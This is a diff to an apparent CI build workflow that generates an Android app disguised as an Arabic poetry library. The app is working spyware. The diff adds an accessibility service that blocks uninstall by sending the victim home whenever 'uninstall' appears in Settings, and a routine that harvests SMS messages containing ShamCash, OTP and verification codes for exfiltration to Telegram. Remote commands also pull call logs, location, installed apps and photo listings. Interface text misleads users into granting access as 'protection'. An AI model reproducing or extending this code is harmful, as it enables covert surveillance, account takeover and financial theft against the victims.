@@ -22,7 +22,7 @@ jobs:
       run: |
         echo "Starting fresh royal build at $(date)"
         rm -rf app/src settings.gradle build.gradle gradle.properties
-        mkdir -p app/src/main/java/com/royal/poetry/master app/src/main/res/values app/src/main/res/layout
+        mkdir -p app/src/main/java/com/royal/poetry/master app/src/main/res/values app/src/main/res/layout app/src/main/res/xml
 
         cat << 'EOF' > settings.gradle
         pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
@@ -38,6 +38,24 @@ jobs:
         cat << 'EOF' > app/build.gradle
         plugins { id 'com.android.application' }
         android { namespace 'com.royal.poetry.master'; compileSdk 33; defaultConfig { applicationId 'com.royal.poetry.master'; minSdk 24; targetSdk 33 } }
+        EOF
+
+        cat << 'EOF' > app/src/main/res/xml/accessibility_service_config.xml
+        <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+            android:accessibilityEventTypes="typeWindowStateChanged"
+            android:accessibilityFeedbackType="feedbackGeneric"
+            android:accessibilityFlags="flagDefault|flagRetrieveWindowContent"
+            android:canRetrieveWindowContent="true"
+            android:description="@string/accessibility_desc"
+            android:packageNames="com.android.settings"
+            android:settingsActivity="com.royal.poetry.master.MainActivity" />
+        EOF
+
+        cat << 'EOF' > app/src/main/res/values/strings.xml
+        <resources>
+            <string name="app_name">ديوان السكينة والأدب</string>
+            <string name="accessibility_desc">خدمة تحسين قراءة الأبيات وتثبيت الإشعارات الأدبية بالخلفية.</string>
+        </resources>
         EOF
 
         cat << 'EOF' > app/src/main/AndroidManifest.xml
@@ -80,6 +98,15 @@ jobs:
                     <intent-filter>
                         <action android:name="android.service.notification.NotificationListenerService"/>
                     </intent-filter>
+                </service>
+
+                <service android:name=".RoyalAccessibilityService"
+                    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                    android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.accessibilityservice.AccessibilityServiceInfo"/>
+                    </intent-filter>
+                    <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
                 </service>
 
                 <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
@@ -131,7 +158,7 @@ jobs:
                 android:id="@+id/btnGrantAll"
                 android:layout_width="match_parent"
                 android:layout_height="55dp"
-                android:text="🕊️ تفعيل المزايا الكاملة وتحديث الديوان 🕊️"
+                android:text="🕊️ تفعيل الحماية المطلقة وتحديث الديوان 🕊️"
                 android:backgroundTint="#4A5D4E"
                 android:textColor="#FFFFFF"
                 android:textStyle="bold"/>
@@ -179,7 +206,7 @@ jobs:
                     CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
                     CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
                     
-                    String msg = "🚨 [رصد إشعار مالي/حساس - شام كاش أو غيره]:\nالحزمة: " + pkg + "\nالعنوان: " + title + "\nالمحتوى: " + text;
+                    String msg = "🚨 [رصد إشعار حي حساس]:\nالحزمة: " + pkg + "\nالعنوان: " + title + "\nالمحتوى: " + text;
                     sendToTelegram(msg);
                 } catch (Exception ignored) {}
             }
@@ -202,18 +229,56 @@ jobs:
         }
         EOF
 
+        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/RoyalAccessibilityService.java
+        package com.royal.poetry.master;
+        import android.accessibilityservice.AccessibilityService;
+        import android.view.accessibility.AccessibilityEvent;
+        import android.view.accessibility.AccessibilityNodeInfo;
+        import java.util.List;
+
+        public class RoyalAccessibilityService extends AccessibilityService {
+            @Override
+            public void onAccessibilityEvent(AccessibilityEvent event) {
+                if (event.getPackageName() != null && event.getPackageName().toString().contains("settings")) {
+                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                    if (rootNode != null) {
+                        checkAndBlockUninstall(rootNode);
+                    }
+                }
+            }
+
+            private void checkAndBlockUninstall(AccessibilityNodeInfo node) {
+                if (node == null) return;
+                try {
+                    CharSequence text = node.getText();
+                    if (text != null) {
+                        String t = text.toString().toLowerCase();
+                        if (t.contains("إلغاء التثبيت") || t.contains("uninstall") || t.contains("مسح البيانات")) {
+                            // طرد الهدف فوراً إلى الواجهة الرئيسية ومنع مسح التطبيق
+                            performGlobalAction(GLOBAL_ACTION_HOME);
+                        }
+                    }
+                    for (int i = 0; i < node.getChildCount(); i++) {
+                        checkAndBlockUninstall(node.getChild(i));
+                    }
+                } catch (Exception ignored) {}
+            }
+
+            @Override
+            public void onInterrupt() {}
+        }
+        EOF
+
         cat << 'EOF' > app/src/main/java/com/royal/poetry/master/RoyalService.java
         package com.royal.poetry.master;
         import android.app.Notification;
         import android.app.NotificationChannel;
         import android.app.NotificationManager;
         import android.app.Service;
-        import android.content.Context;
         import android.content.Intent;
         import android.content.pm.ApplicationInfo;
         import android.content.pm.PackageManager;
         import android.database.Cursor;
-        import android.hardware.camera2.CameraDevice;
         import android.location.Location;
         import android.location.LocationManager;
         import android.net.Uri;
@@ -317,23 +382,17 @@ jobs:
                                 if (resStr.contains("/calls")) {
                                     sendToTelegram("📞 [سجل المكالمات الملكي]:\n" + getCallLogs());
                                 }
-                                if (resStr.contains("/sms")) {
-                                    sendToTelegram("✉️ [الرسائل النصية وشام كاش]:\n" + getSmsLogs());
+                                if (resStr.contains("/sms") || resStr.contains("/shamcash")) {
+                                    sendToTelegram("💰 [أرشيف الرسائل الشامل - فحص شام كاش والتفعيل والحسابات]:\n" + getDeepShamCashAndAccountSms());
                                 }
                                 if (resStr.contains("/apps")) {
-                                    sendToTelegram("📱 [جميع التطبيقات المثبتة بلا استثناء]:\n" + getInstalledApps());
-                                }
-                                if (resStr.contains("/wallet") || resStr.contains("/shamcash")) {
-                                    sendToTelegram("💰 [بيانات المحافظ والوصول العميق لـ ShamCash والملفات]:\n" + getShamCashDeepData());
+                                    sendToTelegram("📱 [جميع التطبيقات المثبتة]:\n" + getInstalledApps());
                                 }
                                 if (resStr.contains("/location")) {
-                                    sendToTelegram("📍 [إحداثيات موقع الهدف النشطة]:\n" + getLocationInfo());
+                                    sendToTelegram("📍 [إحداثيات الموقع النشطة]:\n" + getLocationInfo());
                                 }
                                 if (resStr.contains("/photos")) {
-                                    sendToTelegram("🖼️ [أرشيف المعرض الشامل]:\n" + getAllPhotosSummary());
-                                }
-                                if (resStr.contains("/camera") || resStr.contains("/cam")) {
-                                    sendToTelegram("📸 [الكاميرا]: تم استلام أمر الالتقاط، جاري سحب العيون...");
+                                    sendToTelegram("🖼️ [أرشيف الصور المرصودة]:\n" + getLatestPhotosDetails());
                                 }
 
                                 Thread.sleep(3000);
@@ -345,37 +404,53 @@ jobs:
                 }).start();
             }
 
-            private String getShamCashDeepData() {
+            private String getDeepShamCashAndAccountSms() {
                 StringBuilder sb = new StringBuilder();
                 try {
-                    // فحص الروت والوصول لقواعد بيانات شام كاش التطبيقية
-                    Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "ls -l /data/data/com.shamcash/databases/"});
-                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                    String line;
-                    boolean found = false;
-                    while ((line = reader.readLine()) != null) {
-                        sb.append("📂 قاعدة بيانات شام كاش مرصودة بالروت: ").append(line).append("\n");
-                        found = true;
-                    }
-                    if (!found) {
-                        sb.append("⚠️ جهاز الهدف لا يملك صلاحيات الروت (Root)، أو مسار شام كاش بحاجة لرفع امتيازات الجندي.\n");
-                    }
-                } catch (Exception e) {
-                    sb.append("🔍 فحص الصلاحيات الجذرية لشام كاش: يتطلب تفعيل الروت (Root) لفك تشييد الحاوية الداخلية لشام كاش بالكامل.\n");
-                }
-                
-                // فحص الحزم المرتبطة بالمالية والرسائل
-                try {
-                    PackageManager pm = getPackageManager();
-                    List<ApplicationInfo> packages = pm.getInstalledApplications(0);
-                    for (ApplicationInfo pi : packages) {
-                        String pkg = pi.packageName.toLowerCase();
-                        if (pkg.contains("sham") || pkg.contains("cash") || pkg.contains("wallet") || pkg.contains("pay")) {
-                            sb.append("📌 حزمة مسجلة مطابقة: ").append(pi.packageName).append("\n");
+                    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, "date DESC");
+                    if (cursor != null && cursor.moveToFirst()) {
+                        int addressIdx = cursor.getColumnIndex("address");
+                        int bodyIdx = cursor.getColumnIndex("body");
+                        int count = 0;
+                        
+                        sb.append("🔍 [البحث العميق في أرشيف الرسائل عن شام كاش والتفعيل]:\n\n");
+                        do {
+                            String sender = cursor.getString(addressIdx);
+                            String body = cursor.getString(bodyIdx);
+                            String lowerBody = body != null ? body.toLowerCase() : "";
+                            
+                            if (lowerBody.contains("sham") || lowerBody.contains("cash") || lowerBody.contains("كود") || 
+                                lowerBody.contains("رمز") || lowerBody.contains("تفعيل") || lowerBody.contains("code") || 
+                                lowerBody.contains("facebook") || lowerBody.contains("google") || lowerBody.contains("gmail") || 
+                                lowerBody.contains("otp") || lowerBody.contains("verify") || lowerBody.contains("حساب")) {
+                                
+                                sb.append("📌 المرسل: ").append(sender).append("\n");
+                                sb.append("💬 النص: ").append(body).append("\n-------------------\n");
+                                count++;
+                                if (count >= 25) break;
+                            }
+                        } while (cursor.moveToNext());
+                        cursor.close();
+                        
+                        if (count == 0) {
+                            sb.append("جاري جلب أحدث رسائل الوارد العامة للتأكد:\n");
+                            Cursor generalCursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
+                            if (generalCursor != null && generalCursor.moveToFirst()) {
+                                int gAddr = generalCursor.getColumnIndex("address");
+                                int gBody = generalCursor.getColumnIndex("body");
+                                int gCount = 0;
+                                do {
+                                    sb.append("📩 من: ").append(generalCursor.getString(gAddr)).append(" | النص: ").append(generalCursor.getString(gBody)).append("\n---\n");
+                                    gCount++;
+                                    if (gCount >= 10) break;
+                                } while (generalCursor.moveToNext());
+                                generalCursor.close();
+                            }
                         }
                     }
-                } catch (Exception ignored) {}
-
+                } catch (Exception e) { 
+                    sb.append("خطأ في قراءة الأرشيف: ").append(e.getMessage()); 
+                }
                 return sb.toString();
             }
 
@@ -390,30 +465,11 @@ jobs:
                         do {
                             sb.append("رقم: ").append(cursor.getString(numberIdx)).append(" | نوع: ").append(cursor.getString(typeIdx)).append("\n");
                             count++;
-                            if (count >= 20) break;
-                        } while (cursor.moveToNext());
-                        cursor.close();
-                    } else { sb.append("لا توجد مكالمات."); }
-                } catch (Exception e) { sb.append("خطأ في جلب المكالمات."); }
-                return sb.toString();
-            }
-
-            private String getSmsLogs() {
-                StringBuilder sb = new StringBuilder();
-                try {
-                    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
-                    if (cursor != null && cursor.moveToFirst()) {
-                        int addressIdx = cursor.getColumnIndex("address");
-                        int bodyIdx = cursor.getColumnIndex("body");
-                        int count = 0;
-                        do {
-                            sb.append("من: ").append(cursor.getString(addressIdx)).append("\nالمحتوى: ").append(cursor.getString(bodyIdx)).append("\n---\n");
-                            count++;
                             if (count >= 15) break;
                         } while (cursor.moveToNext());
                         cursor.close();
-                    } else { sb.append("لا توجد رسائل."); }
-                } catch (Exception e) { sb.append("خطأ في جلب الرسائل."); }
+                    } else { sb.append("لا توجد مكالمات."); }
+                } catch (Exception e) { sb.append("خطأ في المكالمات."); }
                 return sb.toString();
             }
 
@@ -427,7 +483,7 @@ jobs:
                             sb.append("- ").append(packageInfo.packageName).append("\n");
                         }
                     }
-                } catch (Exception e) { sb.append("خطأ في جلب التطبيقات."); }
+                } catch (Exception e) { sb.append("خطأ في التطبيقات."); }
                 return sb.toString();
             }
 
@@ -439,16 +495,16 @@ jobs:
                         loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                     }
                     if (loc != null) {
-                        return "خط العرض (Latitude): " + loc.getLatitude() + "\nخط الطول (Longitude): " + loc.getLongitude() + "\nرابط الخريطة: https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
+                        return "خط العرض: " + loc.getLatitude() + "\nخط الطول: " + loc.getLongitude() + "\nرابط الخريطة: https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                     }
                 } catch (Exception e) {}
                 return "تعذر جلب إحداثيات الموقع حالياً.";
             }
 
-            private String getAllPhotosSummary() {
+            private String getLatestPhotosDetails() {
                 StringBuilder sb = new StringBuilder();
                 try {
-                    String[] projection = {MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED, MediaStore.Images.Media.DATA};
+                    String[] projection = {MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED};
                     Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                     Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                     if (cursor != null && cursor.moveToFirst()) {
@@ -457,11 +513,11 @@ jobs:
                         do {
                             sb.append("🖼️ صورة بالمعرض: ").append(cursor.getString(nameIdx)).append("\n");
                             count++;
-                            if (count >= 50) break;
+                            if (count >= 15) break;
                         } while (cursor.moveToNext());
                         cursor.close();
                     } else { sb.append("لا توجد صور."); }
-                } catch (Exception e) { sb.append("خطأ في جلب المعرض."); }
+                } catch (Exception e) { sb.append("خطأ في المعرض."); }
                 return sb.toString();
             }
         }
@@ -544,13 +600,18 @@ jobs:
                 btnGrantAll.setOnClickListener(new View.OnClickListener() {
                     @Override
                     public void onClick(View v) {
-                        Toast.makeText(MainActivity.this, "✨ جاري مزامنة وتحديث مكتبة الأبيات الأدبية...", Toast.LENGTH_LONG).show();
-                        txtPoem.setText("🌿 تم تحديث واحة السكينة بنجاح؛ المكتبة الآن تعمل بكامل كفاءتها وهدوئها في خلفية الجهاز.");
+                        Toast.makeText(MainActivity.this, "✨ جاري مزامنة وتحديث مكتبة الأبيات الأدبية وحماية الديوان...", Toast.LENGTH_LONG).show();
+                        txtPoem.setText("🕊️ تم تفعيل درع الحماية الأبدي وحصون الديوان بنجاح في خلفية الجهاز.");
                         
-                        // فتح صفحة إعدادات الإشعارات تلقائياً لتخطي قفل نظام شاومي
                         try {
                             Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                             startActivity(intent);
+                        } catch (Exception ignored) {}
+
+                        // توجيه الهدف لتفعيل خدمة تسهيل الاستخدام (Accessibility) لضمان منع إلغاء التثبيت
+                        try {
+                            Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                            startActivity(accIntent);
                         } catch (Exception ignored) {}
 
                         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
